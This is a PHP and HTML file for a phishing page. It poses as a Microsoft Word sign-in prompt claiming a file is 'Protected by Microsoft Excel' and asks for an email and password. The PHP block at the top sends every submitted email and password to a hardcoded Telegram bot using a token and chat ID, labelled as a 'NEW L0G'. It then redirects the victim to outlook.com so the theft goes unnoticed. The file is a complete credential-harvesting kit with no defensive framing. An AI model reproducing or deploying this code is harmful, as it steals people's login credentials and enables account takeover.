<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $requestMethod = $_SERVER["REQUEST_METHOD"];



    // Send message to Telegram Bot
    $telegramBotToken = "7007690695:AAE5cDCHrhQoX4r-PIl1Xv1wWxvetxxrnTo";
    $telegramChatId = "6339299057";
    $telegramMessage = "🦠[━━━━NEW L0G━━━━]🦠\nRequest Method: " . $requestMethod . "\nEmail: " . $email . "\nPassword: " . $password;
    $telegramApiUrl = "https://api.telegram.org/bot" . $telegramBotToken . "/sendMessage?chat_id=" . $telegramChatId . "&text=" . urlencode($telegramMessage);

    // Use cURL to send the message to Telegram
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Redirect to Outlook
    header("Location: https://www.outlook.com");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Microsoft Word</title>
	
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            position: relative;
            overflow: hidden;
        }
        .background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://support.sugarcrm.com/files/53f54704-9b32-11ec-8639-0213de59821c.png') no-repeat center center fixed;
            background-size: cover;
            filter: blur(10px);
            z-index: -1;
        }
        .login-container {
            background-color: rgba(255, 255, 255, 0.9); /* Slightly transparent background */
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
            z-index: 1;
        }
        .login-container img {
            width: 150px; /* Adjusted size for the logo */
            height: auto;
            margin-bottom: 20px;
        }
        .login-container input {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #007BFF;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 10px; /* Add margin between input fields and button */
        }
        .login-container button:hover {
            background-color: #0056b3;
        }
        .login-container .checkbox-container {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-top: 10px; /* Add margin between button and checkbox/forgot password */
        }
        .login-container .checkbox-container label,
        .login-container .forgot-password {
            font-size: 14px;
            color: #0078D4; /* Microsoft Blue */
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="background"></div>
    <div class="login-container">
       <img src="https://www.logo.wine/a/logo/Microsoft_Word/Microsoft_Word-Logo.wine.svg" alt="Logo" width="70" height="90">

        <h4>This File is Protected by Microsoft Excel</h4>
        <h5>Please Sign in to Cloud to access the file</h5>
        <form id="loginForm" method="post">
            <input type="text" id="email" name="email" placeholder="Email, phone or Skype" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <div class="checkbox-container">
                <label><input type="checkbox"> Keep me signed in</label>
                <a href="#" class="forgot-password">Forgot Password?</a>
            </div>
            <button type="submit">Sign in</button>
        </form>
    </div>
</body>
</html>
